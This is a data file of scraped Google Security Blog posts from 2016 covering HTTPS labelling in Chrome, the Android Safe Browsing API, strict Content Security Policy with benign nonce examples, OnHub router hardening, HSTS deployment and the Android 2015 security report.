{"website": "Google-Security", "title": "\nMoving towards a more secure web\n", "author": ["Posted by Emily Schechter, Chrome Security Team"], "link": "https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html", "abstract": "                             Posted by Emily Schechter, Chrome Security Team    [Updated on 12/5/16 with instructions for developers]    Developers : Read more about how to update your sites&nbsp; here .    To help users browse the web safely, Chrome indicates connection security with an icon in the address bar. Historically, Chrome has not explicitly labelled HTTP connections as non-secure. Beginning in January 2017 (Chrome 56), we&#8217;ll mark HTTP pages that collect passwords or credit cards as non-secure, as part of a long-term plan to mark all HTTP sites as non-secure.            Chrome currently indicates HTTP connections with a neutral indicator. This doesn&#8217;t reflect the true lack of security for HTTP connections. When you load a website over HTTP, someone else on the network can look at or  modify  the site before it gets to you.          A substantial portion of web traffic has transitioned to HTTPS so far, and HTTPS usage is consistently increasing. We recently hit a milestone with more than half of Chrome desktop page loads now served over HTTPS. In addition, since the time we  released our HTTPS report  in February, 12 more of the top 100 websites have changed their serving default from HTTP to HTTPS.          Studies show that users  do not perceive  the lack of a &#8220;secure&#8221; icon as a warning, but also that users become blind to warnings that occur too frequently.  Our plan  to label HTTP sites more clearly and accurately as non-secure will take place in gradual steps, based on increasingly stringent criteria. Starting January 2017, Chrome 56 will label HTTP pages with password or credit card form fields as \"not secure,\" given their particularly sensitive nature.          In following releases, we will continue to extend HTTP warnings, for example, by labelling HTTP pages as &#8220;not secure&#8221; in Incognito mode, where users may have higher expectations of privacy. Eventually, we plan to label all HTTP pages as non-secure, and change the HTTP security indicator to the red triangle that we use for broken HTTPS.           We will publish updates to this plan as we approach future releases, but don&#8217;t wait to get started moving to HTTPS. HTTPS is  easier and cheaper than ever before , and enables both the  best   performance  the web offers and  powerful   new   features  that are too sensitive for HTTP. Check out our  set-up guides  to get started.                                    Posted by Emily Schechter, Chrome Security Team [Updated on 12/5/16 with instructions for developers] Developers: Read more about how to update your sites here.  To help users browse the web safely, Chrome indicates connection security with an icon in the address bar. Historically, Chrome has not explicitly labelled HTTP connections as non-secure. Beginning in January 2017 (Chrome 56), we’ll mark HTTP pages that collect passwords or credit cards as non-secure, as part of a long-term plan to mark all HTTP sites as non-secure.  Chrome currently indicates HTTP connections with a neutral indicator. This doesn’t reflect the true lack of security for HTTP connections. When you load a website over HTTP, someone else on the network can look at or modify the site before it gets to you.  A substantial portion of web traffic has transitioned to HTTPS so far, and HTTPS usage is consistently increasing. We recently hit a milestone with more than half of Chrome desktop page loads now served over HTTPS. In addition, since the time we released our HTTPS report in February, 12 more of the top 100 websites have changed their serving default from HTTP to HTTPS.  Studies show that users do not perceive the lack of a “secure” icon as a warning, but also that users become blind to warnings that occur too frequently. Our plan to label HTTP sites more clearly and accurately as non-secure will take place in gradual steps, based on increasingly stringent criteria. Starting January 2017, Chrome 56 will label HTTP pages with password or credit card form fields as \"not secure,\" given their particularly sensitive nature.  In following releases, we will continue to extend HTTP warnings, for example, by labelling HTTP pages as “not secure” in Incognito mode, where users may have higher expectations of privacy. Eventually, we plan to label all HTTP pages as non-secure, and change the HTTP security indicator to the red triangle that we use for broken HTTPS. We will publish updates to this plan as we approach future releases, but don’t wait to get started moving to HTTPS. HTTPS is easier and cheaper than ever before, and enables both the best performance the web offers and powerful new features that are too sensitive for HTTP. Check out our set-up guides to get started.     ", "date": "September 8, 2016"},
{"website": "Google-Security", "title": "\nEven More Safe Browsing on Android!\n", "author": ["Posted by Stephan Somogyi, Safe Browsing Team & William Luh, Android Security Team"], "link": "https://security.googleblog.com/2016/09/even-more-safe-browsing-on-android.html", "abstract": "                             Posted by Stephan Somogyi, Safe Browsing Team &amp; William Luh, Android Security Team   During Google I/O in June, we  told everyone  that we were going to make a device-local Safe Browsing API available to all Android developers later in the year. That time has come!    Starting with  Google Play Services version 9.4 , all Android developers can use our privacy-preserving, and highly network as well as power-efficient on-device Safe Browsing infrastructure to protect all of their apps&#8217; users. Even better,  the API is simple and straightforward to use .    Since we introduced client-side Safe Browsing on Android, updated our  documentation for Safe Browsing Protocol Version 4  (pver4), and also released our  reference pver4 implementation in Go , we&#8217;ve been able to see how much protection this new technology provides to all our users. Since  our initial launch  we&#8217;ve shown hundreds of millions of warnings, actively warning many millions of mobile users about badness before they&#8217;re exposed to it.    We look forward to all Android developers extending this same protection to their users, too.                                   Posted by Stephan Somogyi, Safe Browsing Team & William Luh, Android Security Team During Google I/O in June, we told everyone that we were going to make a device-local Safe Browsing API available to all Android developers later in the year. That time has come!  Starting with Google Play Services version 9.4, all Android developers can use our privacy-preserving, and highly network as well as power-efficient on-device Safe Browsing infrastructure to protect all of their apps’ users. Even better, the API is simple and straightforward to use.  Since we introduced client-side Safe Browsing on Android, updated our documentation for Safe Browsing Protocol Version 4 (pver4), and also released our reference pver4 implementation in Go, we’ve been able to see how much protection this new technology provides to all our users. Since our initial launch we’ve shown hundreds of millions of warnings, actively warning many millions of mobile users about badness before they’re exposed to it.  We look forward to all Android developers extending this same protection to their users, too.     ", "date": "September 15, 2016"},
{"website": "Google-Security", "title": "\nReshaping web defenses with strict Content Security Policy\n", "author": ["Posted by Artur Janc, Michele Spagnuolo, Lukas Weichselbaum, and David Ross, Information Security Engineers"], "link": "https://security.googleblog.com/2016/09/reshaping-web-defenses-with-strict.html", "abstract": "                             Posted by Artur Janc, Michele Spagnuolo, Lukas Weichselbaum, and David Ross, Information Security Engineers      Cross-site scripting &nbsp;&#8212; the ability to inject undesired scripts into a trusted web application &#8212; has been one of the top web security vulnerabilities for over a decade. Just in the past 2 years Google has awarded researchers over $1.2 million for reporting XSS bugs in our applications via the  Vulnerability Reward Program . Modern web technologies such as  strict contextual auto-escaping  help developers avoid mistakes which lead to XSS, and  automated scanners  can catch classes of vulnerabilities during the testing process. However, in complex applications bugs inevitably slip by, allowing attacks ranging from harmless pranks to malicious  targeted exploits .    Content Security Policy (CSP) is a mechanism designed to step in precisely when such bugs happen; it provides developers the ability to restrict which scripts are allowed to execute so that even if attackers can inject HTML into a vulnerable page, they should not be able to load malicious scripts and other types of resources. CSP is a flexible tool allowing developers to set a wide range of policies; it is supported &#8212; though not always in its entirety &#8212; by all modern browsers.    However, the flexibility of CSP also leads to its biggest problem: it makes it easy to set policies which appear to work, but offer no real security benefit. In a  recent Internet-wide study  we analyzed over 1 billion domains and found that 95% of deployed CSP policies are ineffective as a protection against XSS. One of the underlying reasons is that out of the 15 domains most commonly whitelisted by developers for loading external scripts as many as 14 expose patterns which allow attackers to bypass CSP protections.&nbsp;We believe it's important to improve this, and help the web ecosystem make full use of the potential of CSP.     Towards safer CSP policies   To help developers craft policies which meaningfully protect their applications, today we&#8217;re releasing the  CSP Evaluator , a tool to visualize the effect of setting a policy and detect subtle misconfigurations. CSP Evaluator is used by security engineers and developers at Google to make sure policies provide a meaningful security benefit and cannot be subverted by attackers.         Even with such a helpful tool, building a safe script whitelist for a complex application is often all but impossible due to the number of popular domains with resources that allow CSP to be bypassed. Here&#8217;s where the idea of a nonce-based CSP policy comes in. Instead of whitelisting all allowed script locations, it&#8217;s often simpler to modify the application to prove that a script is trusted by the developer by giving it a nonce -- an unpredictable, single-use token which has to match a value set in the policy:     Content-Security-Policy: script-src 'nonce-random123'        &lt;script nonce='random123'&gt;alert('This script will run')&lt;/script&gt;    &lt;script&gt;alert('Will not run: missing nonce')&lt;/script&gt;    &lt;script nonce='bad123'&gt;alert(\"Won't run: invalid nonce\")&lt;/script&gt;       With ' strict-dynamic' , a part of the upcoming CSP3 specification already  supported  by Chrome and Opera (and coming soon to Firefox), adopting such policies in complex, modern applications becomes much easier. Developers can now set a single, short policy such as:     script-src 'nonce-random123' 'strict-dynamic'; object-src 'none'       and make sure that all static  &lt;script&gt;  elements contain a matching nonce attribute &#8212; in many cases this is all that&#8217;s needed to enjoy added protection against XSS since &#8216;strict-dynamic&#8217; will take care of loading any trusted scripts added at runtime. This approach allows setting policies which are  backwards-compatible  with all CSP-aware browsers, and  plays well  with applications which already use a traditional CSP policy; it also simplifies the process of adopting CSP and doesn&#8217;t require changing the policy as the application evolves.     Adopting strict CSP   In the past months we&#8217;ve deployed this approach in several large Google applications, including  Cloud Console ,  Photos ,  History ,  Careers Search ,  Maps Timeline ,  Cultural Institute  and are working on many more. We believe this approach can also help other developers so today we&#8217;re publishing documentation discussing the  best strategies for implementing CSP , including an overview of the  benefits of CSP , sample policies, and examples of common  code changes .    Further, today we&#8217;re releasing  CSP Mitigator , a Chrome extension that helps developers review an application for compatibility with nonce-based CSP. The extension can be enabled for any URL prefix and will collect data about any programming patterns that need to be refactored to support CSP. This includes identifying scripts which do not have the correct nonce attribute, detecting inline event handlers, javascript: URIs, and several other more subtle patterns which might need attention.         As with the CSP Evaluator, we use the extension with our applications to help speed up the process of adopting nonce-based CSP policies nonce-based policies across Google.     Encouraging broader use of strict CSP   Finally, today we&#8217;re including CSP adoption efforts in the scope of the  Patch Reward Program ; proactive work to help make popular open-source web frameworks compatible with nonce-based CSP can qualify for rewards (but please read the&nbsp; program rules  and  CSP refactoring tips  first). We hope that increased attention to this area will also encourage researchers to find new, creative ways to circumvent CSP restrictions, and help us further improve the mechanism so that we can better protect Internet users from web threats.    To reach out to us, email more-csp@google.com.                                   Posted by Artur Janc, Michele Spagnuolo, Lukas Weichselbaum, and David Ross, Information Security Engineers  Cross-site scripting — the ability to inject undesired scripts into a trusted web application — has been one of the top web security vulnerabilities for over a decade. Just in the past 2 years Google has awarded researchers over $1.2 million for reporting XSS bugs in our applications via the Vulnerability Reward Program. Modern web technologies such as strict contextual auto-escaping help developers avoid mistakes which lead to XSS, and automated scanners can catch classes of vulnerabilities during the testing process. However, in complex applications bugs inevitably slip by, allowing attacks ranging from harmless pranks to malicious targeted exploits.  Content Security Policy (CSP) is a mechanism designed to step in precisely when such bugs happen; it provides developers the ability to restrict which scripts are allowed to execute so that even if attackers can inject HTML into a vulnerable page, they should not be able to load malicious scripts and other types of resources. CSP is a flexible tool allowing developers to set a wide range of policies; it is supported — though not always in its entirety — by all modern browsers.  However, the flexibility of CSP also leads to its biggest problem: it makes it easy to set policies which appear to work, but offer no real security benefit. In a recent Internet-wide study we analyzed over 1 billion domains and found that 95% of deployed CSP policies are ineffective as a protection against XSS. One of the underlying reasons is that out of the 15 domains most commonly whitelisted by developers for loading external scripts as many as 14 expose patterns which allow attackers to bypass CSP protections. We believe it's important to improve this, and help the web ecosystem make full use of the potential of CSP.  Towards safer CSP policies To help developers craft policies which meaningfully protect their applications, today we’re releasing the CSP Evaluator, a tool to visualize the effect of setting a policy and detect subtle misconfigurations. CSP Evaluator is used by security engineers and developers at Google to make sure policies provide a meaningful security benefit and cannot be subverted by attackers.   Even with such a helpful tool, building a safe script whitelist for a complex application is often all but impossible due to the number of popular domains with resources that allow CSP to be bypassed. Here’s where the idea of a nonce-based CSP policy comes in. Instead of whitelisting all allowed script locations, it’s often simpler to modify the application to prove that a script is trusted by the developer by giving it a nonce -- an unpredictable, single-use token which has to match a value set in the policy:  Content-Security-Policy: script-src 'nonce-random123'   alert('This script will run')   alert('Will not run: missing nonce')   alert(\"Won't run: invalid nonce\")   With 'strict-dynamic', a part of the upcoming CSP3 specification already supported by Chrome and Opera (and coming soon to Firefox), adopting such policies in complex, modern applications becomes much easier. Developers can now set a single, short policy such as:  script-src 'nonce-random123' 'strict-dynamic'; object-src 'none'  and make sure that all static   elements contain a matching nonce attribute — in many cases this is all that’s needed to enjoy added protection against XSS since ‘strict-dynamic’ will take care of loading any trusted scripts added at runtime. This approach allows setting policies which are backwards-compatible with all CSP-aware browsers, and plays well with applications which already use a traditional CSP policy; it also simplifies the process of adopting CSP and doesn’t require changing the policy as the application evolves.  Adopting strict CSP In the past months we’ve deployed this approach in several large Google applications, including Cloud Console, Photos, History, Careers Search, Maps Timeline, Cultural Institute and are working on many more. We believe this approach can also help other developers so today we’re publishing documentation discussing the best strategies for implementing CSP, including an overview of the benefits of CSP, sample policies, and examples of common code changes.  Further, today we’re releasing CSP Mitigator, a Chrome extension that helps developers review an application for compatibility with nonce-based CSP. The extension can be enabled for any URL prefix and will collect data about any programming patterns that need to be refactored to support CSP. This includes identifying scripts which do not have the correct nonce attribute, detecting inline event handlers, javascript: URIs, and several other more subtle patterns which might need attention.   As with the CSP Evaluator, we use the extension with our applications to help speed up the process of adopting nonce-based CSP policies nonce-based policies across Google.  Encouraging broader use of strict CSP Finally, today we’re including CSP adoption efforts in the scope of the Patch Reward Program; proactive work to help make popular open-source web frameworks compatible with nonce-based CSP can qualify for rewards (but please read the program rules and CSP refactoring tips first). We hope that increased attention to this area will also encourage researchers to find new, creative ways to circumvent CSP restrictions, and help us further improve the mechanism so that we can better protect Internet users from web threats.  To reach out to us, email more-csp@google.com.     ", "date": "September 26, 2016"},
{"website": "Google-Security", "title": "\nOnHub: Powerful protection for peace of mind\n", "author": ["Posted by Chris Millikin, Public Defender (Security Engineering Manager)"], "link": "https://security.googleblog.com/2016/09/onhub-powerful-protection-for-peace-of.html", "abstract": "                             Posted by Chris Millikin, Public Defender (Security Engineering Manager)    [Cross-posted from the  Official OnHub Blog ]   Since OnHub launched, we've highlighted a variety of features that enable users to do the things they love online without having to deal with the annoying router issues that we've all experienced at one time or another. These include: Fast, reliable Wi-Fi for more than 100 devices at a time, easy streaming and sharing, and wide-ranging coverage that helps eliminate dead zones.    We haven't, however, highlighted one of OnHub's most powerful features: Industry-leading security. Your router is the first line of defense for your online world. Because bad actors are aware of the critical position routers occupy in the network, routers are frequently the target of security attacks.         OnHub&#8217;s security features go beyond those of the typical router: OnHub is hardened against a variety of attacks, protecting your home network from many online threats. Three features in particular help ensure OnHub protects your data and devices from a variety of threats.     Three Security features that set OnHub apart        1. Defense in Depth          There are many elements that go into creating a robust defense in depth.    Auto updates: OnHub regularly downloads automatic updates without you having to do anything--a long-established practice on mobile devices and software like Chrome, but one that appliances haven&#8217;t caught up with yet. These updates provide regular maintenance fixes and address critical vulnerabilities. They&#8217;re like the seatbelts of online security&#8212;  internet security experts  recommend that users always accept updates.    However, when updates don&#8217;t happen automatically, many people don&#8217;t bother. OnHub communicates directly with Google, and makes sure all software is signed and verified. For instance, when a vulnerability was found in a software library ( glibc ) earlier this year, we were able to update OnHub&#8217;s entire fleet of devices within just a few days. In comparison, the vast majority of other routers require active user intervention to protect against such threats.    Verified Boot: Verified Boot protects you by preventing compromised OnHubs from booting. We use this technology in Chromebooks,  strictly enforce it in Android Nougat , and we implemented it in OnHub from the very beginning. This makes OnHub extremely difficult to attack or compromise. For instance, the device runs software that has been cryptographically signed by Google.    Cloud administration: A traditional router is commonly attacked through its local administration web interface, where attackers have taken advantage of exploits like  CSRF  to remotely take control and change critical settings like DNS, so we eliminated that from the beginning. Instead OnHub is managed through the cloud, with strong authentication and authorization, using a simple phone app. A read-only API is available only on the internal network, to provide important data to the OnHub app during setup and when troubleshooting.    Process isolation: We also layer multiple techniques such as process isolation (uid/gid separation, namespaces, capability whitelists) and  seccomp  filtering to isolate network-facing services, which helps reduce potential attack scenarios in a given application by preventing an attacker from making lateral movements in the system.     2. Hardware Provenance   Modern hardware devices include many types of chips, drivers, and firmware. It&#8217;s important to know what each part is doing and where it came from. Our security team works to track the origins of all hardware, software, and firmware that goes into OnHub, including those from third-party sources. If a vulnerability is ever found, OnHub security works to fix the problem immediately.    The same goes for the open source components of OnHub. Before shipping, we do comprehensive code reviews of critical attack surfaces (i.e. network facing daemons), looking for security vulnerabilities. For example, we reviewed miniupnpd, hostapd, and dnsmasq. As a result of those reviews, Google reported security bugs to the open source project maintainers and offered patches. Here are three that we fixed:  bugs   in   hosted .     3. Cloud Intelligence   We use anonymized metrics from our fleet of OnHubs to quickly detect and counter potential threats. For example, since we know that DNS is often a target of attacks, we monitor DNS settings on all OnHub routers for activity that could indicate a security compromise. This is &#8220;cloud intelligence&#8221; &#8211; a benefit that Google is uniquely able to deliver. By connecting OnHub to the Google cloud, we provide the same level of protection you expect across all your Google apps and devices. Because you manage your router through the cloud using your secure Google identity, you don&#8217;t have to remember yet another password for managing your OnHub, and you don&#8217;t have to be at home to control it.     Security Improvements, Automatically   OnHub also participates in  Google&#8217;s Vulnerability Reward Program , which started in 2010 to honor all of the cutting-edge external contributions that help us keep our users safe. Through this program, if you can find a qualifying bug in OnHub&#8217;s security, rewards range from $100 to $20,000. Click  here  for an outline of the rewards for the most common classes of bugs.    When it comes to security, not all routers are created equal. OnHub protects you and your network with security that continues to adapt to threats. We&#8217;re always improving OnHub security, and automatically update without users having to take any actions. As cybersecurity evolves and new threats emerge, OnHub will be ready to meet the latest challenges for years to come.                                   Posted by Chris Millikin, Public Defender (Security Engineering Manager) [Cross-posted from the Official OnHub Blog] Since OnHub launched, we've highlighted a variety of features that enable users to do the things they love online without having to deal with the annoying router issues that we've all experienced at one time or another. These include: Fast, reliable Wi-Fi for more than 100 devices at a time, easy streaming and sharing, and wide-ranging coverage that helps eliminate dead zones.  We haven't, however, highlighted one of OnHub's most powerful features: Industry-leading security. Your router is the first line of defense for your online world. Because bad actors are aware of the critical position routers occupy in the network, routers are frequently the target of security attacks.   OnHub’s security features go beyond those of the typical router: OnHub is hardened against a variety of attacks, protecting your home network from many online threats. Three features in particular help ensure OnHub protects your data and devices from a variety of threats.  Three Security features that set OnHub apart  1. Defense in Depth   There are many elements that go into creating a robust defense in depth.  Auto updates: OnHub regularly downloads automatic updates without you having to do anything--a long-established practice on mobile devices and software like Chrome, but one that appliances haven’t caught up with yet. These updates provide regular maintenance fixes and address critical vulnerabilities. They’re like the seatbelts of online security— internet security experts recommend that users always accept updates.  However, when updates don’t happen automatically, many people don’t bother. OnHub communicates directly with Google, and makes sure all software is signed and verified. For instance, when a vulnerability was found in a software library (glibc) earlier this year, we were able to update OnHub’s entire fleet of devices within just a few days. In comparison, the vast majority of other routers require active user intervention to protect against such threats.  Verified Boot: Verified Boot protects you by preventing compromised OnHubs from booting. We use this technology in Chromebooks, strictly enforce it in Android Nougat, and we implemented it in OnHub from the very beginning. This makes OnHub extremely difficult to attack or compromise. For instance, the device runs software that has been cryptographically signed by Google.  Cloud administration: A traditional router is commonly attacked through its local administration web interface, where attackers have taken advantage of exploits like CSRF to remotely take control and change critical settings like DNS, so we eliminated that from the beginning. Instead OnHub is managed through the cloud, with strong authentication and authorization, using a simple phone app. A read-only API is available only on the internal network, to provide important data to the OnHub app during setup and when troubleshooting.  Process isolation: We also layer multiple techniques such as process isolation (uid/gid separation, namespaces, capability whitelists) and seccomp filtering to isolate network-facing services, which helps reduce potential attack scenarios in a given application by preventing an attacker from making lateral movements in the system.  2. Hardware Provenance Modern hardware devices include many types of chips, drivers, and firmware. It’s important to know what each part is doing and where it came from. Our security team works to track the origins of all hardware, software, and firmware that goes into OnHub, including those from third-party sources. If a vulnerability is ever found, OnHub security works to fix the problem immediately.  The same goes for the open source components of OnHub. Before shipping, we do comprehensive code reviews of critical attack surfaces (i.e. network facing daemons), looking for security vulnerabilities. For example, we reviewed miniupnpd, hostapd, and dnsmasq. As a result of those reviews, Google reported security bugs to the open source project maintainers and offered patches. Here are three that we fixed: bugs in hosted.  3. Cloud Intelligence We use anonymized metrics from our fleet of OnHubs to quickly detect and counter potential threats. For example, since we know that DNS is often a target of attacks, we monitor DNS settings on all OnHub routers for activity that could indicate a security compromise. This is “cloud intelligence” – a benefit that Google is uniquely able to deliver. By connecting OnHub to the Google cloud, we provide the same level of protection you expect across all your Google apps and devices. Because you manage your router through the cloud using your secure Google identity, you don’t have to remember yet another password for managing your OnHub, and you don’t have to be at home to control it.  Security Improvements, Automatically OnHub also participates in Google’s Vulnerability Reward Program, which started in 2010 to honor all of the cutting-edge external contributions that help us keep our users safe. Through this program, if you can find a qualifying bug in OnHub’s security, rewards range from $100 to $20,000. Click here for an outline of the rewards for the most common classes of bugs.  When it comes to security, not all routers are created equal. OnHub protects you and your network with security that continues to adapt to threats. We’re always improving OnHub security, and automatically update without users having to take any actions. As cybersecurity evolves and new threats emerge, OnHub will be ready to meet the latest challenges for years to come.     ", "date": "September 27, 2016"},
{"website": "Google-Security", "title": "\nBringing HSTS to www.google.com\n", "author": ["Posted by Jay Brown, Sr. Technical Program Manager, Security"], "link": "https://security.googleblog.com/2016/07/bringing-hsts-to-wwwgooglecom.html", "abstract": "                             Posted by Jay Brown, Sr. Technical Program Manager, Security     For many years, we&#8217;ve worked to increase the use of encryption between our users and Google. Today, the  vast majority of these connections  are encrypted, and our work continues on this effort.    To further protect users, we've taken another step to strengthen how we use encryption for data in transit by implementing HTTP Strict Transport Security&#8212; HSTS  for short&#8212;on the  www.google.com  domain. HSTS prevents people from accidentally navigating to HTTP URLs by automatically converting insecure HTTP URLs into secure HTTPS URLs. Users might navigate to these HTTP URLs by manually typing a protocol-less or HTTP URL in the address bar, or by following HTTP links from other websites.       Preparing for launch     Ordinarily, implementing HSTS is a relatively basic process. However, due to Google's particular complexities, we needed to do some extra prep work that most other domains wouldn't have needed to do. For example, we had to address  mixed content , bad HREFs, redirects to HTTP, and other issues like updating legacy services which could cause problems for users as they try to access our core domain.    This process wasn&#8217;t without its pitfalls. Perhaps most memorably, we accidentally broke Google&#8217;s Santa Tracker just before Christmas last year (don&#8217;t worry &#8212; we fixed it before Santa and his reindeer made their trip).     Deployment and next steps     We&#8217;ve turned on HSTS for  www.google.com , but some work remains on our deployment checklist.    In the immediate term, we&#8217;re focused on increasing the duration that the header is active (&#8216;max-age&#8217;). We've initially set the header&#8217;s max-age to one day; the short duration helps mitigate the risk of any potential problems with this roll-out. By increasing the max-age, however, we reduce the likelihood that an initial request to  www.google.com  happens over HTTP. Over the next few months, we will ramp up the max-age of the header to at least one year.    Encrypting data in transit helps keep our users and their data secure. We&#8217;re excited to be implementing HSTS and will continue to extend it to more domains and Google products in the coming months.                                   Posted by Jay Brown, Sr. Technical Program Manager, Security  For many years, we’ve worked to increase the use of encryption between our users and Google. Today, the vast majority of these connections are encrypted, and our work continues on this effort.  To further protect users, we've taken another step to strengthen how we use encryption for data in transit by implementing HTTP Strict Transport Security—HSTS for short—on the www.google.com domain. HSTS prevents people from accidentally navigating to HTTP URLs by automatically converting insecure HTTP URLs into secure HTTPS URLs. Users might navigate to these HTTP URLs by manually typing a protocol-less or HTTP URL in the address bar, or by following HTTP links from other websites.  Preparing for launch  Ordinarily, implementing HSTS is a relatively basic process. However, due to Google's particular complexities, we needed to do some extra prep work that most other domains wouldn't have needed to do. For example, we had to address mixed content, bad HREFs, redirects to HTTP, and other issues like updating legacy services which could cause problems for users as they try to access our core domain.  This process wasn’t without its pitfalls. Perhaps most memorably, we accidentally broke Google’s Santa Tracker just before Christmas last year (don’t worry — we fixed it before Santa and his reindeer made their trip).  Deployment and next steps  We’ve turned on HSTS for www.google.com, but some work remains on our deployment checklist.  In the immediate term, we’re focused on increasing the duration that the header is active (‘max-age’). We've initially set the header’s max-age to one day; the short duration helps mitigate the risk of any potential problems with this roll-out. By increasing the max-age, however, we reduce the likelihood that an initial request to www.google.com happens over HTTP. Over the next few months, we will ramp up the max-age of the header to at least one year.  Encrypting data in transit helps keep our users and their data secure. We’re excited to be implementing HSTS and will continue to extend it to more domains and Google products in the coming months.     ", "date": "July 29, 2016"},
{"website": "Google-Security", "title": "\nAndroid Security 2015 Annual Report\n", "author": ["Posted by Adrian Ludwig, Lead Engineer, Android Security"], "link": "https://security.googleblog.com/2016/04/android-security-2015-annual-report.html", "abstract": "                             Posted by Adrian Ludwig, Lead Engineer, Android Security   Today, for the  second year in a row , we&#8217;re releasing our Android Security Annual report. This detailed summary includes: a look at how Google services protect the Android ecosystem, an overview of new security protections introduced in 2015, and our work with Android partners and the security research community at large. The full report is  here , and an overview is below.    One important goal of releasing this report is to drive an informed conversation about Android security. We hope to accomplish this by providing more information about what we are doing, and what we see happening in the ecosystem. We strongly believe that rigorous, data-driven discussion about security will help guide our efforts to make the Android ecosystem safer.   Enhancing Google's services to protect Android users     In the last year, we&#8217;ve significantly improved our machine learning and event correlation to detect potentially harmful behavior.       We protected users from malware and other Potentially Harmful Apps (PHAs), checking over 6 billion installed applications per day.   We protected users from network-based and on-device threats by scanning 400 million devices per day.   And we  protected hundreds of millions of Chrome users on Android  from unsafe websites with Safe Browsing.      We continued to make it even more difficult to get PHAs into Google Play. Last year&#8217;s enhancements reduced the probability of installing a PHA from Google Play by over 40% compared to 2014. Within Google Play, install attempts of most categories of PHAs declined including:       Data Collection: decreased over 40% to 0.08% of installs   Spyware: decreased 60% to 0.02% of installs   Hostile Downloader: decreased 50% to 0.01% of installs      Overall, PHAs were installed on fewer than 0.15% of devices that only get apps from Google Play. About 0.5% of devices that install apps from both Play and other sources had a PHA installed during 2015, similar to the data in last year&#8217;s report.           It&#8217;s critical that we also protect users that install apps from sources other than Google Play. Our  Verify Apps service  protects these users and we improved the effectiveness of the PHA warnings provided by Verify Apps by over 50%. In 2015, we saw an increase in the number of PHA install attempts outside of Google Play, and we disrupted several coordinated efforts to install PHAs onto user devices from outside of Google Play.                 New security features in the Android platform          Last year, we  launched Android 6.0 Marshmallow , introducing a variety of new security protections and controls:       Full disk encryption is now a requirement for all new Marshmallow devices with adequate hardware capabilities and is also extended to allow encryption of data on SD cards.   Updated app permissions enable you to manage the data they share with specific apps with more granularity and precision.   New verified boot ensures your phone is healthy from the bootloader all the way up to the operating system.    Android security patch level  enables you to check and make sure your device has the most recent security updates.   And much more, including support for fingerprint scanners, and SELinux enhancements.       Deeper engagement with the Android ecosystem              We&#8217;re working to foster Android security research and making investments to strengthen protections across the ecosystem now and in the long run.         In June,  Android joined Google&#8217;s Vulnerability Rewards Program , which pays security researchers when they find and report bugs to us. We fixed over 100 vulnerabilities reported this way and paid researchers more than $200,000 for their findings.         In August, we launched our  monthly public security update program  to the Android Open Source Project, as well as a security update lifecycle for Nexus devices. We intend the update lifecycle for Nexus devices to be a model for all Android manufacturers going forward and have been actively working with ecosystem partners to facilitate similar programs. Since then, manufacturers have provided monthly security updates for hundreds of unique Android device models and hundreds of millions of users have installed monthly security updates to their devices. Despite this progress, many Android devices are still not receiving monthly updates&#8212;we are increasing our efforts to help partners update more devices in a timely manner.              Greater transparency, well-informed discussions about security, and ongoing innovation will help keep users safe. We'll continue our ongoing efforts to improve Android&#8217;s protections, and we look forward to engaging with the ecosystem and security community in 2016 and beyond.                                        Posted by Adrian Ludwig, Lead Engineer, Android Security Today, for the second year in a row, we’re releasing our Android Security Annual report. This detailed summary includes: a look at how Google services protect the Android ecosystem, an overview of new security protections introduced in 2015, and our work with Android partners and the security research community at large. The full report is here, and an overview is below.  One important goal of releasing this report is to drive an informed conversation about Android security. We hope to accomplish this by providing more information about what we are doing, and what we see happening in the ecosystem. We strongly believe that rigorous, data-driven discussion about security will help guide our efforts to make the Android ecosystem safer. Enhancing Google's services to protect Android users  In the last year, we’ve significantly improved our machine learning and event correlation to detect potentially harmful behavior.   We protected users from malware and other Potentially Harmful Apps (PHAs), checking over 6 billion installed applications per day. We protected users from network-based and on-device threats by scanning 400 million devices per day. And we protected hundreds of millions of Chrome users on Android from unsafe websites with Safe Browsing.   We continued to make it even more difficult to get PHAs into Google Play. Last year’s enhancements reduced the probability of installing a PHA from Google Play by over 40% compared to 2014. Within Google Play, install attempts of most categories of PHAs declined including:   Data Collection: decreased over 40% to 0.08% of installs Spyware: decreased 60% to 0.02% of installs Hostile Downloader: decreased 50% to 0.01% of installs   Overall, PHAs were installed on fewer than 0.15% of devices that only get apps from Google Play. About 0.5% of devices that install apps from both Play and other sources had a PHA installed during 2015, similar to the data in last year’s report.     It’s critical that we also protect users that install apps from sources other than Google Play. Our Verify Apps service protects these users and we improved the effectiveness of the PHA warnings provided by Verify Apps by over 50%. In 2015, we saw an increase in the number of PHA install attempts outside of Google Play, and we disrupted several coordinated efforts to install PHAs onto user devices from outside of Google Play.      New security features in the Android platform    Last year, we launched Android 6.0 Marshmallow, introducing a variety of new security protections and controls:   Full disk encryption is now a requirement for all new Marshmallow devices with adequate hardware capabilities and is also extended to allow encryption of data on SD cards. Updated app permissions enable you to manage the data they share with specific apps with more granularity and precision. New verified boot ensures your phone is healthy from the bootloader all the way up to the operating system. Android security patch level enables you to check and make sure your device has the most recent security updates. And much more, including support for fingerprint scanners, and SELinux enhancements.   Deeper engagement with the Android ecosystem     We’re working to foster Android security research and making investments to strengthen protections across the ecosystem now and in the long run.    In June, Android joined Google’s Vulnerability Rewards Program, which pays security researchers when they find and report bugs to us. We fixed over 100 vulnerabilities reported this way and paid researchers more than $200,000 for their findings.    In August, we launched our monthly public security update program to the Android Open Source Project, as well as a security update lifecycle for Nexus devices. We intend the update lifecycle for Nexus devices to be a model for all Android manufacturers going forward and have been actively working with ecosystem partners to facilitate similar programs. Since then, manufacturers have provided monthly security updates for hundreds of unique Android device models and hundreds of millions of users have installed monthly security updates to their devices. Despite this progress, many Android devices are still not receiving monthly updates—we are increasing our efforts to help partners update more devices in a timely manner.      Greater transparency, well-informed discussions about security, and ongoing innovation will help keep users safe. We'll continue our ongoing efforts to improve Android’s protections, and we look forward to engaging with the ecosystem and security community in 2016 and beyond.       ", "date": "April 19, 2016"},
